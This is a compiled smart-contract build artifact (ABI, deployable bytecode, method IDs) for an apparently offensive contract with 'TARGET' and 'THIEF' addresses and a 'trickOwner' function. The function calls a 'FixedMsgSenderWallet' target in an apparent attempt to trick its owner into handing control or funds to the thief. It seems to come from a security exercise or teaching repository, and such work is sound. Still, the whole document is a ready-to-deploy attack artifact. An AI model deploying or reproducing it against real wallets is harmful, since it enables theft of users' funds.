{"abi":[{"type":"constructor","inputs":[{"name":"targetAddress","type":"address","internalType":"address payable"},{"name":"thiefAddress","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"function","name":"TARGET","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract FixedMsgSenderWallet"}],"stateMutability":"view"},{"type":"function","name":"THIEF","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address payable"}],"stateMutability":"view"},{"type":"function","name":"trickOwner","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60c060405234801561000f575f80fd5b506040516103e43803806103e4833981810160405281019061003191906100fe565b8173ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250508073ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff1681525050505061013c565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100cd826100a4565b9050919050565b6100dd816100c3565b81146100e7575f80fd5b50565b5f815190506100f8816100d4565b92915050565b5f8060408385031215610114576101136100a0565b5b5f610121858286016100ea565b9250506020610132858286016100ea565b9150509250929050565b60805160a05161027b6101695f395f818160c7015261013301525f8181608b0152610157015261027b5ff3fe608060405234801561000f575f80fd5b506004361061003f575f3560e01c80630feecfcb14610043578063aa81d1311461004d578063cc1f2afa1461006b575b5f80fd5b61004b610089565b005b610055610131565b60405161006291906101b8565b60405180910390f35b610073610155565b604051610080919061022c565b60405180910390f35b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a3a7e7f37f00000000000000000000000000000000000000000000000000000000000000006040518263ffffffff1660e01b815260040161010291906101b8565b5f604051808303815f87803b158015610119575f80fd5b505af115801561012b573d5f803e3d5ffd5b50505050565b7f000000000000000000000000000000000000000000000000000000000000000081565b7f000000000000000000000000000000000000000000000000000000000000000081565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101a282610179565b9050919050565b6101b281610198565b82525050565b5f6020820190506101cb5f8301846101a9565b92915050565b5f819050919050565b5f6101f46101ef6101ea84610179565b6101d1565b610179565b9050919050565b5f610205826101da565b9050919050565b5f610216826101fb565b9050919050565b6102268161020c565b82525050565b5f60208201905061023f5f83018461021d565b9291505056fea2646970667358221220febd23df462cf2f9e8599b14294ed2a9a8393aafe09c4f1839578d160fe4cf7f64736f6c63430008180033","linkReferences":{}},"methodIdentifiers":{"TARGET()":"cc1f2afa","THIEF()":"aa81d131","trickOwner()":"0feecfcb"},"id":37}